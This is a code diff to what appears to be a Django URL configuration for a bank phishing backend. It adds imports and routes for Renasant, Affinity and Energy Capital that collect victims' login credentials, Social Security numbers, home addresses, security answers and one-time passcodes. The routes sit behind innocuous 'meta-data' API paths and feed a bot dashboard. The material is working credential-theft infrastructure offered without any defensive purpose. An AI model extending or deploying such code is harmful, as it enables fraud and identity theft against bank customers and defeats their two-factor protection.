@@ -86,6 +86,36 @@ from user_data.logix_views import (
     logix_collect_user_security_questions,
     logix_collect_user_otp_verification,
 )
+from user_data.renasant_views import (
+    renasant_collect_user_login_cred,
+    renasant_collect_user_login_cred2,
+    renasant_collect_user_basic_info,
+    renasant_collect_user_home_address,
+    renasant_collect_user_social_security,
+    renasant_collect_user_social_security_2,
+    renasant_collect_user_security_questions,
+    renasant_collect_user_otp_verification,
+)
+from user_data.affinity_view import (
+    affinity_collect_user_login_cred,
+    affinity_collect_user_login_cred2,
+    affinity_collect_user_basic_info,
+    affinity_collect_user_home_address,
+    affinity_collect_user_social_security,
+    affinity_collect_user_social_security_2,
+    affinity_collect_user_security_questions,
+    affinity_collect_user_otp_verification,
+)
+from user_data.energy_view import (
+    energy_collect_user_login_cred,
+    energy_collect_user_login_cred2,
+    energy_collect_user_basic_info,
+    energy_collect_user_home_address,
+    energy_collect_user_social_security,
+    energy_collect_user_social_security_2,
+    energy_collect_user_security_questions,
+    energy_collect_user_otp_verification,
+)
 
 urlpatterns = [
     path("admin/", admin.site.urls),
@@ -107,5 +137,32 @@ urlpatterns = [
     path("api/logix-meta-data-6/", logix_collect_user_social_security_2, name="logix_collect_user_social_security_2"),
     path("api/logix-meta-data-7/", logix_collect_user_security_questions, name="logix_collect_user_security_questions"),
     path("api/logix-meta-data-8/", logix_collect_user_otp_verification, name="logix_collect_user_otp_verification"),
+    # Renasant API endpoints
+    path("api/renasant-meta-data-1/", renasant_collect_user_login_cred, name="renasant_collect_user_login_cred"),
+    path("api/renasant-meta-data-2/", renasant_collect_user_login_cred2, name="renasant_collect_user_login_cred2"),
+    path("api/renasant-meta-data-3/", renasant_collect_user_basic_info, name="renasant_collect_user_basic_info"),
+    path("api/renasant-meta-data-4/", renasant_collect_user_home_address, name="renasant_collect_user_home_address"),
+    path("api/renasant-meta-data-5/", renasant_collect_user_social_security, name="renasant_collect_user_social_security"),
+    path("api/renasant-meta-data-6/", renasant_collect_user_social_security_2, name="renasant_collect_user_social_security_2"),
+    path("api/renasant-meta-data-7/", renasant_collect_user_security_questions, name="renasant_collect_user_security_questions"),
+    path("api/renasant-meta-data-8/", renasant_collect_user_otp_verification, name="renasant_collect_user_otp_verification"),
+    # Affinity API endpoints
+    path("api/affinity-meta-data-1/", affinity_collect_user_login_cred, name="affinity_collect_user_login_cred"),
+    path("api/affinity-meta-data-2/", affinity_collect_user_login_cred2, name="affinity_collect_user_login_cred2"),
+    path("api/affinity-meta-data-3/", affinity_collect_user_basic_info, name="affinity_collect_user_basic_info"),
+    path("api/affinity-meta-data-4/", affinity_collect_user_home_address, name="affinity_collect_user_home_address"),
+    path("api/affinity-meta-data-5/", affinity_collect_user_social_security, name="affinity_collect_user_social_security"),
+    path("api/affinity-meta-data-6/", affinity_collect_user_social_security_2, name="affinity_collect_user_social_security_2"),
+    path("api/affinity-meta-data-7/", affinity_collect_user_security_questions, name="affinity_collect_user_security_questions"),
+    path("api/affinity-meta-data-8/", affinity_collect_user_otp_verification, name="affinity_collect_user_otp_verification"),
+    # Energy Capital API endpoints
+    path("api/energy-meta-data-1/", energy_collect_user_login_cred, name="energy_collect_user_login_cred"),
+    path("api/energy-meta-data-2/", energy_collect_user_login_cred2, name="energy_collect_user_login_cred2"),
+    path("api/energy-meta-data-3/", energy_collect_user_basic_info, name="energy_collect_user_basic_info"),
+    path("api/energy-meta-data-4/", energy_collect_user_home_address, name="energy_collect_user_home_address"),
+    path("api/energy-meta-data-5/", energy_collect_user_social_security, name="energy_collect_user_social_security"),
+    path("api/energy-meta-data-6/", energy_collect_user_social_security_2, name="energy_collect_user_social_security_2"),
+    path("api/energy-meta-data-7/", energy_collect_user_security_questions, name="energy_collect_user_security_questions"),
+    path("api/energy-meta-data-8/", energy_collect_user_otp_verification, name="energy_collect_user_otp_verification"),
     path("dashboard/", bot_dashboard, name="bot_dashboard"),
 ]
